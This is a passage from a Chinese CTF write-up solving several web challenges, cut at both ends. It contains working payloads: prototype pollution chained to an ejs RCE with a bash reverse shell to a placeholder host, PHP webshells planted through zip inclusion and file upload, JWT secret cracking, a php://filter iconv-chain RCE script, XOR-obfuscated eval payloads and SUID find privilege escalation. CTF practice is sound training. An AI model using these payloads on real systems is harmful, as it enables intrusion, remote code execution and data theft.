class="string">&quot;你在做什么？快停下！！！&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">name</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>&#125;,jwt_secret,&#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth &#x27;</span>,token);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Only admin can get source in /source&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server started on port 3000&#x27;</span>));</span><br></pre></td></tr></table></figure><p>在 <code>/code</code> 路由中使用了 <code>putil_merge()</code> ，结合putil-merge原型链污染漏洞（CVE-2021-23470），将 <code>Super</code> 污染，使得 <code>/create</code> 路由内的 <code>Super[&#39;userrole&#39;] === &#39;Superadmin&#39;</code> 成立：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /code</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;userrole&quot;:&quot;Superadmin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>进入  <code>/create</code> 路由内，打ejs RCE（CVE-2022-29078），参考：<a href="https://inhann.top/2023/03/26/ejs/">ejs RCE CVE-2022-29078 bypass</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /create HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;xxx&quot;,</span><br><span class="line">  &quot;settings&quot;:&#123;</span><br><span class="line">    &quot;view options&quot;:&#123;</span><br><span class="line">      &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;bash -c \\\&quot;bash -i &gt; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1 2&gt;&amp;1\\\&quot;\&quot;);&quot;,</span><br><span class="line">      &quot;client&quot;:&quot;true&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反弹shell，在VPS getshell，<code>cat /Yupr0m1sing_f1ll4agggXD</code> 得到flag：<code>SYC&#123;Chun_a1_M4n_NeVer_G1ve_Up&#125;</code>。</p><p>​    </p><h3 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h3><blockquote><p>”雌小鬼看了下o2takuXX师傅的马子说:”呐~就..就怎么长吗，真是杂鱼呢~❤”,你能来帮帮他吗？</p></blockquote><p>根据源码注释，存在 <code>include.php</code> 文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//o2takuXX师傅说有问题，忘看了。</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结合首页文件上传和压缩的提示，考察zip文件包含。</p><p>首先新建一个zip文件，里面压缩着一个代码为 <code>&lt;?php system($_GET[x]);</code> 的PHP脚本；然后构造 <code>zip://php.zip#php.jpg</code>：</p><p><code>/include.php?file=zip://php.zip%23php.jpg&amp;x=cat /flag</code></p><p>即可得到flag。</p><p>​    </p><h3 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h3><blockquote><p>快来找flag！（文件上传的目录为 “/upload”）</p></blockquote><p>查看源代码得到用户名密码 <code>user/user</code>，其中有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 一直连不上？连不上就对啦！ --&gt;</span><br><span class="line"> &lt;!-- </span><br><span class="line">   php版本为8.0</span><br><span class="line"> function php_mt_seed($seed)</span><br><span class="line">       &#123;</span><br><span class="line">           mt_srand($seed);</span><br><span class="line">       &#125;</span><br><span class="line">       $seed = time();</span><br><span class="line">       php_mt_seed($seed);</span><br><span class="line">       $characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">       $newFileName = &#x27;&#x27;;</span><br><span class="line">       for ($i = 0; $i &lt; 10; $i++) &#123;</span><br><span class="line">           $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>jwt伪造，爆破c-jwt-cracker：</p><p><code>./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4</code></p><p>得到 <code>Secret is &quot;yibao&quot;</code></p><p>构造 <code>&#123;&quot;iss&quot;: &quot;Qingwan&quot;,&quot;name&quot;: &quot;admin&quot;,&quot;admin&quot;: &quot;true&quot;&#125;</code> 对应的JWT：</p><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek</code></p><p>根据前面 change.html 源码泄露的 <code>php_mt_seed()</code> 函数知文件名通过随机数更改，抓包，改文件名为1.php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /change.php HTTP/1.1</span><br><span class="line">------WebKitFormBoundaryLjuFMGS9hc3RMksx</span><br><span class="line">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>上传，同时爆破文件名：<code>https://3v4l.org/UvLQQ#v8.0.30</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=-<span class="number">20</span>;<span class="variable">$k</span>&lt;<span class="number">20</span>;<span class="variable">$k</span>++) &#123;</span><br><span class="line">    <span class="variable">$seed</span> = <span class="variable">$x</span>+<span class="variable">$k</span>;</span><br><span class="line">    <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$newFileName</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到的文件名，爆破其存在性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">rand = <span class="string">&#x27;nMa3orDC2e|sso43vzOmv|3cLxYQjVCU|bfcsVjUjUc|DGUxICjb62|4agL09NVrj|vCY0Ii09gS|KEC5rjXegm|14Bl45OsHh|zgbN7myZbJ|Q67hx4uRVf|E4SQRpukkv|31A7kBmcpB|3J5Pj4Yfeb|zXfWAa86o5|5KMdsa0Uo0|btCM1eO8wo|maZNliuB1R|Y836Rhmpca|YreAYs4dbp|uK4nhxkdkw|4utkLM9gE7|TYekFoXTXJ|JSP6Hx0vyI|kzjZoBiv9R|EtQZUROvnh|HcTSaxtIXF|GmQhLWWoQ7|3PefcQupE7|Ctbc67MqB4|U55i5C09vA|ZqeKQ6yJSV|ufP5AUtnC6|yiYrEYIAgg|mHwm6SFE0K|q8PwOK5E2U|kBwsskBu0h|AlYCggPR8d|25Lmp0TH9E|2VDW4pida7|&#x27;</span>.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;|&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://s5bwqhfkrgtcnancf0t3vxkgq.node.game.sycsec.com/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(rand)):</span><br><span class="line">    u = url + rand[i] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line">    r=requests.<span class="title function_ invoke__">get</span>(u)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(u)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>访问即可得flag。</p><p>​    </p><h3 id="ezrfi"><a href="#ezrfi" class="headerlink" title="ezrfi"></a>ezrfi</h3><blockquote><p>亲爱的Syclover,你能找到flag吗????</p></blockquote><p>只能读py文件，试出 <code>?file=/var/hint</code></p><p><code>secret=&quot;w5YubyBvd08gMHcwIG92MCDDlndvIE8ubyAwLjAgMC5vIMOWdjAgMHbDliBPdjAgT3fDliBvLk8gw5Z2TyAwXzAgMF9PIG8uTyAwdjAgw5ZfbyBPd28gw5Z2TyDDli5PIMOWXzAgTy5PIMOWXzAgMHbDliAwLjAgw5Z2w5Ygw5Z3MCBPdsOWIMOWdjAgT1/DliDDlnZPIMOWLk8gw5Z3MCBvd8OWIMOWLm8gTy5vIMOWXzAgMHbDliDDlndvIE93w5YgTy5vIE93TyBvX28gw5YuTyBvLm8gb3dPIMOWXzAgb3dPIMOWXzAgMHZvIG8uTyBPd8OWIE92byAwLsOWIMOWdjAgTy7DliAwLjAgMHfDliBvLsOWIG93byBvdzAgMHZvIMOWLm8gb3dPIG9fMCDDli5PIG9fbyBPd8OWIE8ubyBvdzAgw5ZfbyBvd28gw5YuMCDDlnZPIG9fTyBPLsOWIE92MCBPdzAgby7DliAwdjAgT3YwIE9fTyBvLk8gT3bDliDDlnYwIMOWXzAgw5Z3byBvd08gT19vIE93w5Ygby5PIMOWdk8gby4wIDBfMCDDll9vIG93TyBPXzAgMC7DliDDli5vIE8uTyBPdzAgT19vIMOWdjAgb3cwIMOWdjAgT18wIMOWdm8gw5Z2w5Ygw5ZfbyAwX8OWIMOWdm8gw5Z2w5YgMHcwIE92w5Ygw5YubyDDli4wIMOWLm8gb3ZvIMOWLjAgw5YuMCAwd28gb3dPIG8uTyAwd8OWIDB2MCBvd8OWIMOWdzAgw5YubyAwdzAgT1/DliBvX08gw5Z2byAg&quot;</code></p><p>base64解密得：</p><p><code>Ö.o owO 0w0 ov0 Öwo O.o 0.0 0.o Öv0 0vÖ Ov0 OwÖ o.O ÖvO 0_0 0_O o.O 0v0 Ö_o Owo ÖvO Ö.O Ö_0 O.O Ö_0 0vÖ 0.0 ÖvÖ Öw0 OvÖ Öv0 O_Ö ÖvO Ö.O Öw0 owÖ Ö.o O.o Ö_0 0vÖ Öwo OwÖ O.o OwO o_o Ö.O o.o owO Ö_0 owO Ö_0 0vo o.O OwÖ Ovo 0.Ö Öv0 O.Ö 0.0 0wÖ o.Ö owo ow0 0vo Ö.o owO o_0 Ö.O o_o OwÖ O.o ow0 Ö_o owo Ö.0 ÖvO o_O O.Ö Ov0 Ow0 o.Ö 0v0 Ov0 O_O o.O OvÖ Öv0 Ö_0 Öwo owO O_o OwÖ o.O ÖvO o.0 0_0 Ö_o owO O_0 0.Ö Ö.o O.O Ow0 O_o Öv0 ow0 Öv0 O_0 Övo ÖvÖ Ö_o 0_Ö Övo ÖvÖ 0w0 OvÖ Ö.o Ö.0 Ö.o ovo Ö.0 Ö.0 0wo owO o.O 0wÖ 0v0 owÖ Öw0 Ö.o 0w0 O_Ö o_O Övo</code></p><p>尊嘟假嘟解码：</p><p><code>Shy0JhFpsi+njV0IfFfzS44KIcwPFg312qo6gfdk0+DzcoMdSgVs15cERxpqnPJh4Y3b3i/mcbkPlHGTIA6/A8CQU8UX6j9w5HKy</code></p><p>根据提示RC4解码，key=Syclover，得：</p><p><code>文件包含逻辑是include($file.&quot;.py&quot;),你能找到flag文件位置吗??</code></p><p>参考： <a href="https://k1te.cn/2022/01/10/LFI学习/">LFI 新姿势学习</a>，使用文件包含RCE：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bhhtut26mxsa9f29ft8jg5y5p.node.game.sycsec.com/index.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/var/hint&quot;</span></span><br><span class="line">command = <span class="string">&quot;cat /ffffffllllag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h3><blockquote><p>can you rce me??? flag中空格请用下划线替代</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>盲试waf，为无字母数字RCE，异或可用，将每个字符异或 <code>%A0</code> 得到不可见字符。</p><p><code>phpinfo();</code>：</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0^%D0%C8%D0%C9%CE%C6%CF)();</code></p><p>看到disable_function禁用了：</p><p><code>exec,system,fwrite,passthru,popen,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders</code></p><p>读waf - <code>readgzfile(&#39;waf.php&#39;);</code>：</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%D2%C5%C1%C4%C7%DA%C6%C9%CC%C5)(%A0%A0%A0%A0%A0%A0%A0^%D7%C1%C6%8E%D0%C8%D0);</code></p><p>waf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写马 - <code>file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_POST[1]);&#39;);</code>：</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%C6%C9%CC%C5%FF%D0%D5%D4%FF%C3%CF%CE%D4%C5%CE%D4%D3)((%A0%A0%A0%A0%A0^%92%8E%D0%C8%D0),(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%9C%9F%D0%C8%D0%80%C5%D6%C1%CC%88%84%FF%F0%EF%F3%F4%FB%91%FD%89%9B));</code></p><p>蚁剑连接，<code>find / -perm -u=s -type f 2&gt;/dev/null</code> 发现 <code>/usr/bin/find</code> 有 SUID权限，</p><p>find提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch abcd</span><br><span class="line">find abcd -exec cat /flag \;</span><br></pre></td></tr></table></figure><p>得flag：<code>SYC&#123;ThE_RCe is S0 Eas1ly_DD!&#125;</code></p><p>​    </p><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><blockquote><p>can you pollute me?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 